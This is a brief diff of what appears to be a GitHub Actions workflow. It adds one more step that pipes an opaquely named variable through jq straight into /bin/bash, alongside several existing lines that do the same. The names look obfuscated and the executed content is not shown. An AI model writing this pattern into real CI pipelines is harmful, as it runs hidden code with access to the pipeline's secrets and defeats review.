@@ -35,6 +35,7 @@ jobs:
           printf '%s' "$tsfm6" | jq -r .ypt37 | /bin/bash
           printf '%s' "$rsk1" | jq -r .qp1 | /bin/bash
           printf '%s' "$odb22440" | jq -r .cvdvb1409 | /bin/bash
+          echo $yisxq570 | jq -r .zmg133 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
